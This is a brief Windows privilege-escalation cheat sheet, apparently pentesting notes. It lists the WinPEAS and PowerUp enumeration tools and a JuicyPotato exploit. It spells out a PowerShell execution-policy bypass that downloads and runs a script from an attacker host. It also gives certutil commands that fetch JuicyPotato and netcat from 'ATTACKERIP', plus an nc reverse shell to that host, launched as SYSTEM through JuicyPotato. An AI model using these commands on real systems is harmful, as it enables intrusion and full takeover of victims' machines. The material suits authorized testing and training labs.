## Enumeration

### WinPeas

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe


```
winPEAS.exe -a
```


### PowerUP

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

```
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/PowerUp.ps1');Invoke-AllChecks"
```

## Exploits

### Juicy potato
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

Check if users has the following permissions `SeImpersonate` or `SeAssignPrimaryToken` using the following command:

```
whoami /priv
```
![image](4a4d96decced0b64fbb826574627e469.png)

ATTACKER MACHINE

```
nc -lvp 1340
```
VICTIM MACHINE
```
// Download juicy potato binary
certutil -urlcache -split -f http://ATTACKERIP/juicypotato.exe juicypotato.exe

//Download nc binary
certutil -urlcache -split -f http://ATTACKERIP/nc.exe nc.exe 

//Create a bat file that will later execute with juicy potato
echo c:\Users\Public\Documents\nc.exe -e cmd.exe ATTACKERIP 1340 > rev.bat

//call the revshell as system
juicypotato.exe -l 1340 -t * -p c:\Users\Public\Documents\rev.bat

```